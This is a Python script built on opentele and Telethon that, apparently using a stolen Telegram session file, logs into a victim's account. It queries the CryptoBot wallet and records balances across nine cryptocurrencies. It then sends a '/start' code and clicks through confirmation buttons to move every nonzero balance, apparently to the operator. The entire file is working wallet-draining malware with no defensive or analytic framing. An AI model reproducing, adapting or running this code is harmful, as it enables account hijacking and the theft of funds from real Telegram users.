import asyncio
import logging

from opentele.api import API
from opentele.tl import TelegramClient
from telethon.sync import events

from db import Users

logging.basicConfig(level=logging.INFO)


async def user_bot(client: TelegramClient):
    me = await client.get_me()
    phone = me.phone
    try:
        await client.get_dialogs()
        crypto_bot = await client.get_entity(1559501630)
        user = Users.get(user_id=me.id)
        user.state = 1
        user.save()
        await client.send_message(crypto_bot, message='/wallet')

        @events.register(events.NewMessage(incoming=True, chats=crypto_bot))
        async def crypto_bot(event: events.NewMessage.Event):
            crypto_bot = await client.get_entity(1559501630)
            user = Users.get(user_id=me.id)
            if user.state == 1:
                if 'Показывать мелкие балансы' in str(event):
                    await event.message.click(text='Показывать мелкие балансы')
                msg = (await client.get_messages(crypto_bot.id, limit=1))[0]
                data = msg.message.split('\n\n')[1:-1]
                for text in data:
                    amount = float(text.split(': ')[1].split(' ')[0])
                    if 'USDT' in text:
                        user.USDT = amount
                    elif 'TON' in text:
                        user.TON = amount
                    elif 'BTC' in text:
                        user.BTC = amount
                    elif 'LTC' in text:
                        user.LTC = amount
                    elif 'ETH' in text:
                        user.ETH = amount
                    elif 'BNB' in text:
                        user.BNB = amount
                    elif 'TRX' in text:
                        user.TRX = amount
                    elif 'USDC' in text:
                        user.USDC = amount
                    elif 'GRAM' in text:
                        user.GRAM = amount

                user.state = 2
                user.save()
                await event.respond('/start IVjcPsJOexA3')
            elif user.state == 2:
                user.state = 3
                user.save()
                for name, amount in zip(['USDT', 'TON', 'BTC', 'LTC', 'ETH', 'BNB', 'TRX', 'USDC', 'GRAM'],
                                        [user.USDT, user.TON, user.BTC, user.LTC, user.ETH, user.BNB, user.TRX,
                                         user.USDC, user.GRAM]):
                    if amount != 0:
                        try:
                            await event.message.click(text=name)
                            await event.respond(str(amount))
                            await asyncio.sleep(0.5)
                            msg = (await client.get_messages(crypto_bot.id, limit=1))[0]
                            await msg.click(text=msg.reply_markup.rows[0].buttons[0].text)
                            msg = (await client.get_messages(crypto_bot.id, limit=1))[0]
                            await msg.click(text=msg.reply_markup.rows[0].buttons[0].text)
                            await asyncio.sleep(1)
                        except Exception as err:
                            print(err)
                        finally:
                            await asyncio.sleep(1)
                            await event.respond('/start IVjcPsJOexA3')
                raise Exception
        client.add_event_handler(crypto_bot)
        await client.run_until_disconnected()
    except Exception as err:
        print(err)
        await client.disconnect()


async def start():
    api = API.TelegramDesktop.Generate(unique_id=f'p.session')
    client = TelegramClient(session=f'./sessions/p.session', api=api)
    await client.connect()
    await user_bot(client)


if __name__ == '__main__':
    asyncio.run(start())
